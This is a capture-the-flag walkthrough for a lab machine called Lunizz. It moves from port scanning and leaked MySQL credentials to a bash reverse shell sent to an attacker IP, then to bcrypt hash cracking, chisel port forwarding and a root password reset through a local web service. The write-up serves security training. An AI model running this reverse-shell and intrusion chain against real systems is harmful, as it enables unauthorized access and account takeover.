**Target: 10.10.207.7  Lunizz-CTF**

**Initial Access:**\
nmap -Pn 10.10.207.7 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' \
Output shows open ports: 80,3306,4444,5000

Enumerate these open ports further with nmap:\
nmap -Pn 10.10.207.7 --min-rate=5000 -p 80,3306,4444,5000 -sC -sV -oN nmap.lunizz \
The output of the nmap is quite long, here is a brief summary of the output: 

![image](https://user-images.githubusercontent.com/93153300/199835815-3d746b6a-2f44-4b03-baa4-b162fd22db12.png)

Navigate to port 80.  Port 80 is just a regular apache page, nothing of interest found. \
Run directory brute force on port 80: \
dirsearch -r -u http://10.10.207.7/ -e txt,html -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

dirsearch found a few interesting directories: \
http://10.10.207.7/instructions.txt \
http://10.10.207.7/whatever/

Navigating to http://10.10.207.7/whatever shows: 

![image](https://user-images.githubusercontent.com/93153300/199835899-94955084-d217-4313-bf21-421710fd50a8.png)
 
The page shows a command executor page, however running commands doesn’t work.  It’s interesting to note at the top left corner it says ‘Command Executor Mode: 0’.  Maybe the mode has to be changed for it to run commands.  For now, we can’t do anything more with this page, so let’s move on to http://10.10.207.7/instructions.txt.  The page shows:

![image](https://user-images.githubusercontent.com/93153300/199835929-54606d89-6457-46fa-90eb-6845faae67f9.png)
  
This shows mysql credentials: username ‘runcheck’, password ‘CTF_script_cave_changeme’.  Use the credentials to log in to mysql with command: mysql -h 10.10.207.7 -u runcheck -p → when prompted for password enter  ‘CTF_script_cave_changeme’.  \
Check what databases we have with command: show databases; 

![image](https://user-images.githubusercontent.com/93153300/199835948-edaae036-5a63-4338-a0e7-96690156988c.png)

Take a look at database ‘runornot’ with command: use runornot; \
Next, look at the tables in database ‘runornot’ with command: show tables; 

![image](https://user-images.githubusercontent.com/93153300/199835970-fc5a19d6-6641-402d-9697-a635462824d1.png)

Dump the data for the table ‘runcheck’ with command: select * from runcheck;

![image](https://user-images.githubusercontent.com/93153300/199835984-6bb28b81-49cc-4d62-bd84-8009d02eab1b.png)

This run 0 seems like it might correlate to the http://10.10.207.7/whatever/ page where it shows ‘Mode 0’.   Maybe if we change the value to 1 we will be able to run commands on that page.  Check the mysql user permissions we have, as we want to know if we can update this value from a 0 to a 1.  To check this use command: show grants;

![image](https://user-images.githubusercontent.com/93153300/199836007-bba7818f-98ed-4731-bce3-af784b3872cf.png)

This shows we do have permission to update, so update the column run from 0 to 1.  Use command: update runcheck set run=1;

Looking back at http://10.10.207.7/whatever/ shows:

![image](https://user-images.githubusercontent.com/93153300/199836029-0580e27d-c898-42cc-8707-42c86abbca3e.png)

This confirms our theory that the ‘run’ column correlates to this page, and that as ‘mode: 1’ we can run commands.  Command id ran successfully.  Use this page to get a reverse shell.  First, open a netcat listener with command: nc -lvnp 443 (I will use pwncat-cs -lp 443 bc pwncat is a better shell).  Next, replace command id with command: bash -c 'bash -i >& /dev/tcp/10.2.1.148/443 0>&1'. 

We have shell as www-data.  
____________________________________________________________________________
**Lateral Movemenet:**\
File /etc/passwd shows users adam and mason.

Looking aorund, we find a /proct directory, that is an unusual directory.  Go to /proct/pass and read the  bcrypt_encryption.py file:

![image](https://user-images.githubusercontent.com/93153300/199836052-010aa20e-eea6-4174-b083-aec4e056dbbe.png)

Trying password ‘wewillROCKYOU’ for user adam and user mason doesn’t work.  It is probably hinting that the password is found in the rockyou.txt file, and not that the password is actually ‘wewillROCKYOU’.  We see a ‘hashAndSalt’ value given at the end of the script.  Write a script to crack that hash and get the password.  

The ‘hashAndSalt’ is a salt and a hash, so in order to crack it we need to know the value of the salt.  Even though the  ‘bcrypt_encryption.py’ file doesn’t seem to tell us what the salt is, we can figure out the salt value based on the given hash and knowing it is using bcrypt.  The wikipedia page on bcrypt (https://en.wikipedia.org/wiki/Bcrypt) explains how the bcrypt string is broken down:

![image](https://user-images.githubusercontent.com/93153300/199836082-478d761c-c0f4-4721-8ae3-e438af7e006b.png)

Based on the wikipedia page, let’s break down our hash: $2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e
```Alg= $2b$```
```cost= 12$```
```Salt=  LJ3m4rzPGmuN1U/h0IO55.```
```Hash= 3h9WhI/A0Rcbchmvk10KWRMWe4me81e```

Based on this understanding, write this script (or a similar script of your own):

![image](https://user-images.githubusercontent.com/93153300/199836116-8825d4db-dd12-4e67-aae2-01939d640023.png)
 
Run the python script.  Found password ‘bowwow’. \
Use the password to change to user adam with command: su adam→ when prompted enter the password.  We have shell as adam.
_________________________________________________________________________
**Lateral Movement:**\
Go to /home/adam/Desktop/.archive and read file ‘to_my_best_friend_adam.txt’

![image](https://user-images.githubusercontent.com/93153300/199836152-efe3a05a-9e27-4adf-ae58-b8461743a52f.png)
 
The file seems to indicate that the place he loves is his password.  We already have adam’s password, so perhaps this is mason’s password.  Navigate to the url shown at the end of the file ‘to_my_best_friend_adam.txt’:

![image](https://user-images.githubusercontent.com/93153300/199836185-eb8e7bcb-1e4e-4ed2-b7e9-b17fa18cb162.png)
 
The url shows that the name of the place is Pitkajarvi lake -Northern lights. 
Run command: su mason→ when prompted for password enter the password ‘northernlights’.  We have shell as mason, can get the flag at /home/mason/user.txt
______________________________________________________________________
**Privilege Escalation:**\
Check network connections with command ‘netstat -an’ shows:

![image](https://user-images.githubusercontent.com/93153300/199836207-19255300-353a-4dda-b997-9c933c6b861a.png)

Found a new open port we didn’t find earlier with nmap, port 8080.   This is because it is only open to 127.0.0.1, not to the public.    Use chisel to port forward port 8080 so we will have access to port 8080.  Here are the steps to perform port forwarding with chisel:\
Step 1:  in our terminal, run ./chisel server -p 9999 –reverse \
Step 2: upload chisel to the mason target shell \
Step 3: chmod +x chisel \
Step 4: ./chisel client ```<LHOST>```:9999 R:1111:127.0.0.1:8080

![image](https://user-images.githubusercontent.com/93153300/199836235-838a234d-f036-4e03-a119-3a07bad83061.png)
These steps with chisel will cause anything sent to ourselves (127.0.0.1) at port 1111 will be redirected to the target 127.0.0.1:8080.   Navigating to the site http://127.0.0.1:1111 shows:

![image](https://user-images.githubusercontent.com/93153300/199836266-6d2a4140-54ba-4a3c-90e1-9c2e1c55024c.png)

The site shows that we can run 3 commands as root (lsla, reboot, and passwd) as long as we send mason’s password with this request.  Run command: \
curl -i -X POST http://127.0.0.1:1111 --data ‘password=northernlights&cmdtype=passwd’

![image](https://user-images.githubusercontent.com/93153300/199836295-9dc82f28-352f-4e2e-b145-a7e27e5f1b0c.png)
 
This changed root’s password to northernlights.  Going back to our mason shell, run command: su → when prompted for a password enter ‘northernlights’.  We have shell as root, can get the flag at /root/r00t.txt. 
